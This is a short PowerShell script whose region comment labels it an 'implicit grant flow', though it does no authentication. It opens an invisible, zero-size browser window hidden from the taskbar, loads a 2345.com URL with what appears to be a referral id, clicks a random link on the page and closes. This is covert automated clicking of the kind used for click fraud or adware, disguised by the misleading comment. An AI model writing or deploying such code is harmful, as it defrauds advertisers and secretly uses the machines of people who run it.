function hi
{
$isClick = $false;
#region - Implicit grant flow
Add-Type -AssemblyName System.Windows.Forms
$OnDocumentCompleted = {
	foreach ($archor in $web.Document.Links){
		$archor.SetAttribute("target", "_self");
	}
	if(-not $isClick){
		$isClick = $true
		$rd = new-object System.Random
		$id = $rd.Next() % $web.Document.Links.Count
		[System.Console]::WriteLine($id)
		$send = $web.Document.Links[$id];
		$send.InvokeMember("click");
		[System.Threading.Thread]::Sleep(1000)
	}
	else{
		[System.Threading.Thread]::Sleep(1000)
		$Form.Close()
	}
}

$web = new-object System.Windows.Forms.WebBrowser -Property @{Width=0;Height=0;ScriptErrorsSuppressed=$false}
$web.Add_DocumentCompleted($OnDocumentCompleted)

$form = new-object System.Windows.Forms.Form -Property @{Width=0;Height=0;FormBorderStyle='None';ShowInTaskBar=$false;Opacity=0}
$form.Add_Shown({$form.Activate()})
$form.Controls.Add($web)

$web.Navigate("http://www.2345.com/?k82156406")
$null = $form.ShowDialog()

#endregion
}
